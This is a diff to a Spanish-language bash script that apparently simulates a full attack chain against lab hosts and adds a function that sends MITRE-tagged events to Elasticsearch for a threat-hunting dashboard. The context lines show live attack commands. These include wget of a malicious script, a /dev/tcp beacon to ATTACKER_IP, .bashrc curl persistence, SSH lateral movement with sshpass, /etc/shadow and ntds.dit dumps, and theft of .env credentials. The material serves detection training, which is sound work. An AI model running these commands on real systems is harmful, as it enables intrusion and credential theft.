@@ -80,6 +80,27 @@ pause_for_elk() {
     sleep $1
 }
 
+# Enviar evento directamente a Elasticsearch para dashboard en tiempo real
+elk_event() {
+    local event_type="$1"
+    local technique="$2"
+    local tactic="$3"
+    local endpoint="$4"
+    local endpoint_ip="$5"
+    local risk_level="$6"
+    local description="$7"
+    local extra="$8"
+    local NOW=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
+    local TODAY=$(date +%Y.%m.%d)
+    local ES_URL="http://elasticsearch:9200"
+    
+    local DOC='{"@timestamp":"'"${NOW}"'","event_type":"'"${event_type}"'","technique":"'"${technique}"'","tactic":"'"${tactic}"'","endpoint":"'"${endpoint}"'","endpoint_ip":"'"${endpoint_ip}"'","risk_level":"'"${risk_level}"'","description":"'"${description}"'"}'
+    
+    curl -s -X POST "${ES_URL}/threat-hunting-${TODAY}/_doc" \
+        -H "Content-Type: application/json" \
+        -d "${DOC}" > /dev/null 2>&1
+}
+
 ###############################################################################
 # INICIO DEL ATAQUE
 ###############################################################################
@@ -99,6 +120,7 @@ step "Simulando que maria.gonzalez descarga 'factura_pendiente.pdf.sh' desde sit
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "wget -q http://10.10.10.66/malicious_update.sh -O /tmp/factura_pendiente.pdf.sh" 2>/dev/null
 success "Archivo malicioso descargado en WS-FINANZAS-01:/tmp/factura_pendiente.pdf.sh"
+elk_event "initial_access" "T1566.002" "Initial Access" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Usuario descarga archivo malicioso factura_pendiente.pdf.sh"
 
 step "Registrando evento de descarga en logs..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
@@ -119,6 +141,7 @@ step "Ejecutando payload (reverse shell simulada + beacon)..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "nohup bash -c 'while true; do echo beacon > /dev/tcp/${ATTACKER_IP}/4444 2>/dev/null; sleep 30; done' &" 2>/dev/null
 success "Beacon C2 establecido desde WS-FINANZAS-01 hacia ${ATTACKER_IP}:4444"
+elk_event "execution" "T1059.004" "Execution" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Reverse shell establecida hacia C2 server 10.10.10.200:4444"
 
 step "Creando proceso hijo sospechoso (encoded command)..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
@@ -151,6 +174,8 @@ sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "echo '# System update check
 curl -s http://${ATTACKER_IP}:8080/update > /dev/null 2>&1 &' >> /home/maria.gonzalez/.bashrc" 2>/dev/null
 success "Persistencia establecida via crontab + .bashrc"
+elk_event "persistence" "T1053.003" "Persistence" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Crontab backdoor instalado - beacon cada 5 minutos"
+elk_event "persistence" "T1546.004" "Persistence" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Bashrc modificado para persistencia adicional"
 
 step "Registrando persistencia..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
@@ -180,6 +205,8 @@ step "Escaneando puertos SSH abiertos en la red..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "for ip in 101 102 103 104 105; do nc -zv 10.10.10.\$ip 22 2>&1 | grep succeeded; done > /tmp/ssh_targets.txt" 2>/dev/null
 success "Targets SSH identificados para movimiento lateral"
+elk_event "discovery" "T1046" "Discovery" "WS-FINANZAS-01" "10.10.10.101" "MEDIUM" "Network scan nmap -sn 10.10.10.0/24 - 5 hosts descubiertos"
+elk_event "discovery" "T1087.001" "Discovery" "WS-FINANZAS-01" "10.10.10.101" "MEDIUM" "Enumeracion de usuarios y puertos SSH abiertos"
 
 step "Registrando reconocimiento..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
@@ -197,6 +224,7 @@ step "Movimiento lateral a WS-RRHH-01 (10.10.10.102)..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET2} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
 success "WS-RRHH-01 comprometido via SSH desde WS-FINANZAS-01"
+elk_event "lateral_movement" "T1021.004" "Lateral Movement" "WS-RRHH-01" "10.10.10.102" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"
 
 # Instalar beacon en TARGET2
 step "Instalando beacon en WS-RRHH-01..."
@@ -213,6 +241,7 @@ step "Movimiento lateral a SRV-FILESERVER-01 (10.10.10.103)..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET3} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
 success "SRV-FILESERVER-01 comprometido via SSH"
+elk_event "lateral_movement" "T1021.004" "Lateral Movement" "SRV-FILESERVER-01" "10.10.10.103" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"
 
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
     "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"lateral_movement_received\",\"source\":\"10.10.10.101\",\"method\":\"ssh\",\"user\":\"root\",\"threat\":\"T1021.004\"}' >> /var/log/attack_simulation.log" 2>/dev/null
@@ -222,6 +251,7 @@ step "Movimiento lateral a WS-DESARROLLO-01 (10.10.10.104)..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET4} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
 success "WS-DESARROLLO-01 comprometido via SSH"
+elk_event "lateral_movement" "T1021.004" "Lateral Movement" "WS-DESARROLLO-01" "10.10.10.104" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"
 
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
     "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"lateral_movement_received\",\"source\":\"10.10.10.101\",\"method\":\"ssh\",\"user\":\"root\",\"threat\":\"T1021.004\"}' >> /var/log/attack_simulation.log" 2>/dev/null
@@ -231,6 +261,7 @@ step "Movimiento lateral a DC-CORP-01 (10.10.10.105) - OBJETIVO FINAL..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET5} 'echo DOMAIN_COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
 success "DC-CORP-01 (Domain Controller) COMPROMETIDO!"
+elk_event "lateral_movement" "T1021.004" "Lateral Movement" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Domain Controller comprometido via SSH chain"
 
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
     "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"domain_controller_compromised\",\"source\":\"10.10.10.101\",\"method\":\"ssh_chain\",\"user\":\"root\",\"threat\":\"T1021.004\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null
@@ -247,12 +278,15 @@ for target in ${TARGET1} ${TARGET2} ${TARGET3} ${TARGET4} ${TARGET5}; do
     sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
         "cat /etc/shadow > /tmp/.shadow_dump_$(hostname) 2>/dev/null" 2>/dev/null
 done
-success "Shadow files extraídos de 5 endpoints"
+success "Shadow files extraidos de 5 endpoints"
+elk_event "credential_access" "T1003.008" "Credential Access" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Dump de /etc/shadow en todos los endpoints"
+elk_event "credential_access" "T1003.008" "Credential Access" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Dump de /etc/shadow en Domain Controller"
 
 step "Buscando credenciales en archivos de configuración..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
     "find /home -name '*.env' -o -name 'config*' -o -name '*.conf' 2>/dev/null | head -20 > /tmp/.found_configs.txt && cat /home/pedro.silva/projects/.env > /tmp/.stolen_creds.txt" 2>/dev/null
 success "Credenciales de desarrollo encontradas (AWS keys, DB passwords)"
+elk_event "credential_access" "T1552.001" "Credential Access" "WS-DESARROLLO-01" "10.10.10.104" "CRITICAL" "API keys y DB passwords encontrados en archivos .env"
 
 step "Extrayendo claves SSH para persistencia..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
@@ -261,7 +295,8 @@ sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
 step "Simulando DCSync en Domain Controller..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
     "cat /var/lib/samba/private/ntds.dit > /tmp/.ntds_dump 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"dcsync_simulation\",\"target\":\"ntds.dit\",\"threat\":\"T1003.003\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null
-success "NTDS.dit extraído del Domain Controller (simulado)"
+success "NTDS.dit extraido del Domain Controller (simulado)"
+elk_event "credential_access" "T1003.003" "Credential Access" "DC-CORP-01" "10.10.10.105" "CRITICAL" "DCSync - NTDS.dit extraido del Domain Controller"
 
 pause_for_elk 10
 
@@ -273,7 +308,8 @@ phase_header "7" "COLLECTION - Data Staging" "T1005, T1074.001"
 step "Recolectando datos sensibles del File Server..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
     "tar czf /tmp/.exfil_data.tar.gz /srv/shares/ 2>/dev/null" 2>/dev/null
-success "Datos del File Server comprimidos para exfiltración"
+success "Datos del File Server comprimidos para exfiltracion"
+elk_event "collection" "T1005" "Collection" "SRV-FILESERVER-01" "10.10.10.103" "HIGH" "Datos sensibles del file server comprimidos para exfiltracion"
 
 step "Recolectando documentos de Finanzas..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
@@ -288,7 +324,8 @@ for target in ${TARGET1} ${TARGET2} ${TARGET3}; do
     sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
         "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"data_collection\",\"files_staged\":\"/tmp/.exfil_*.tar.gz\",\"threat\":\"T1074.001\"}' >> /var/log/attack_simulation.log" 2>/dev/null
 done
-success "Datos sensibles preparados para exfiltración en 3 endpoints"
+success "Datos sensibles preparados para exfiltracion en 3 endpoints"
+elk_event "collection" "T1074.001" "Collection" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Datos de Finanzas, RRHH y File Server staged para exfiltracion"
 
 pause_for_elk 8
 
@@ -312,6 +349,8 @@ step "Registrando exfiltración..."
 sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
     "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"data_exfiltration\",\"method\":\"http_post\",\"destination\":\"${ATTACKER_IP}:8080\",\"data_size\":\"estimated_50MB\",\"threat\":\"T1048.003\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null
 success "Datos exfiltrados exitosamente (simulado)"
+elk_event "exfiltration" "T1048.003" "Exfiltration" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Datos exfiltrados via HTTP POST a C2 server 10.10.10.200:8080"
+elk_event "exfiltration" "T1048.003" "Exfiltration" "SRV-FILESERVER-01" "10.10.10.103" "CRITICAL" "Datos del file server exfiltrados al atacante"
 
 pause_for_elk 10
 
@@ -342,7 +381,9 @@ for target in ${TARGET1} ${TARGET2} ${TARGET3} ${TARGET4} ${TARGET5}; do
     sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
         "echo '${RANSOM_NOTE}' > /tmp/RANSOM_NOTE.txt && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"ransomware_simulation\",\"note_path\":\"/tmp/RANSOM_NOTE.txt\",\"threat\":\"T1486\",\"severity\":\"CRITICAL\",\"note\":\"SIMULATION_ONLY\"}' >> /var/log/attack_simulation.log" 2>/dev/null
 done
-success "Notas de rescate desplegadas (SIMULACIÓN - sin cifrado real)"
+success "Notas de rescate desplegadas (SIMULACION - sin cifrado real)"
+elk_event "impact" "T1486" "Impact" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Ransomware simulation - notas de rescate desplegadas en 5 endpoints"
+elk_event "impact" "T1486" "Impact" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Ransomware simulation - Domain Controller afectado"
 
 pause_for_elk 5
 
